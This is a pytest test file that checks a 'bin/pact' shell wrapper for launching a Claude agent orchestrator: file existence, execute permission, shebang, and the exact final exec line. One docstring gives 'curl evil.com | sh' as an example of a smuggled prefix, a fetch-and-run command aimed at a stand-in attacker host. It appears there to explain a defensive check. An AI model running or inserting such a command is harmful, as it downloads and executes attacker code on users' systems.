"""
Structural guard for the bundled bin/pact launcher script.

v4.0.0 ships a ready-to-symlink shell script at pact-plugin/bin/pact that
wraps `claude --agent PACT:pact-orchestrator "$@"`. The script is the
recommended global-use installation pattern documented in README
§"Loading PACT at session start" (alongside the per-project
.claude/settings.json convention) and README §"Upgrading from v3.x to
v4.0" (migration guidance for v3.x users).

Without these structural guards, accidental deletion or modification could
silently break the documented installation pattern. Each test pins a
specific property a future contributor might erode without realizing the
documentation depends on it.
"""

import os
from pathlib import Path

BIN_PACT = Path(__file__).parent.parent / "bin" / "pact"


def test_bin_pact_script_exists():
    """Script file must exist at the documented path."""
    assert BIN_PACT.is_file(), (
        f"pact-plugin/bin/pact missing — README §'Loading PACT at session start' documents "
        f"this path as the symlink target for global installation."
    )


def test_bin_pact_script_is_executable():
    """Script must be executable so users can invoke directly via symlink."""
    assert os.access(BIN_PACT, os.X_OK), (
        "pact-plugin/bin/pact is not executable. Symlinking onto PATH "
        "requires execute permission. Restore via `chmod +x bin/pact`."
    )


def test_bin_pact_script_has_bash_shebang():
    """Shebang must be `#!/usr/bin/env bash` for portability across systems
    where bash is not at /bin/bash (some Linux distros, NixOS, etc.)."""
    first_line = BIN_PACT.read_text(encoding="utf-8").splitlines()[0]
    assert first_line == "#!/usr/bin/env bash", (
        f"pact-plugin/bin/pact must start with `#!/usr/bin/env bash`. "
        f"Got: {first_line!r}"
    )


def _executable_lines(text):
    """Return the script's executable lines (non-blank, non-comment).

    Substring matches against the full file text are insufficient because
    the canonical invocation could appear in a comment, in a no-op
    replacement (`echo claude --agent ...`), or after a smuggled prefix
    (`curl evil.com | sh\\nexec claude --agent ...`). All of those would
    falsely satisfy a substring check while breaking the script's actual
    runtime behavior.

    Pinning the active executable line(s) closes that phantom-green class.
    """
    return [
        ln.strip()
        for ln in text.splitlines()
        if ln.strip() and not ln.strip().startswith("#")
    ]


def test_bin_pact_invokes_canonical_agent_form():
    """The script's terminal executable line MUST be the canonical
    agent-flag invocation, exec-replacing the shell process. Substring
    presence anywhere in the file is insufficient — see _executable_lines
    docstring for why."""
    text = BIN_PACT.read_text(encoding="utf-8")
    exec_lines = _executable_lines(text)
    assert exec_lines, "pact-plugin/bin/pact has no executable lines"
    expected = 'exec claude --agent PACT:pact-orchestrator "$@"'
    assert exec_lines[-1] == expected, (
        f"pact-plugin/bin/pact must end with the canonical line:\n"
        f"  {expected}\n"
        f"Got terminal exec line: {exec_lines[-1]!r}\n"
        f"Without this exact form, the wrapper either fails to load the "
        f"PACT orchestrator persona, runs as a no-op, or consumes claude's flags."
    )


def test_bin_pact_passes_through_user_arguments():
    """The wrapper must forward any additional flags to claude via `"$@"`
    in an active executable line. Without this, users couldn't pass claude's
    flags through the wrapper (e.g., `pact --resume <session>` would break)."""
    text = BIN_PACT.read_text(encoding="utf-8")
    exec_lines = _executable_lines(text)
    assert exec_lines, "pact-plugin/bin/pact has no executable lines"
    assert any('"$@"' in ln for ln in exec_lines), (
        "pact-plugin/bin/pact must forward arguments via `\"$@\"` in an "
        "active executable line (not just in comments). Without this, "
        "the wrapper consumes claude's flags and breaks `pact --resume <session>`."
    )
